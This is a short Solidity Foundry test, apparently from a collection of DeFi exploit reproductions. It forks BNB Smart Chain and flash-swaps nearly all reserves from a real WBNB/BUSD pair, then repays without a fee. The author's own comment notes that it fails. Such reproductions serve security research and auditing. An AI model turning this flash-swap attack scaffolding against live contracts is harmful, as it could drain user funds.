// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract Exploit is DSTest {
  IPancakePair wbnbBusdPair =
    IPancakePair(0xaCAac9311b0096E04Dfe96b6D87dec867d3883Dc);
  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  function setUp() public {
    cheats.createSelectFork("bsc", 18671800);
  }

  function testExploit() public {
    (uint112 _reserve0, uint112 _reserve1, ) = wbnbBusdPair.getReserves();
    wbnbBusdPair.swap(
      _reserve0 - 1,
      _reserve1 - 1,
      address(this),
      new bytes(1)
    );
  }

  function BiswapCall(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) public {
    emit log_named_uint(
      "After flashswap, WBNB balance of attacker:",
      wbnb.balanceOf(address(this)) / 1e18
    );
    emit log_named_uint(
      "After flashswap, BUSD balance of attacker:",
      busd.balanceOf(address(this)) / 1e18
    );
    wbnb.transfer(address(wbnbBusdPair), wbnb.balanceOf(address(this)));
    busd.transfer(address(wbnbBusdPair), busd.balanceOf(address(this)));
    //No enough balance, of course failed
  }

  receive() external payable {}
}
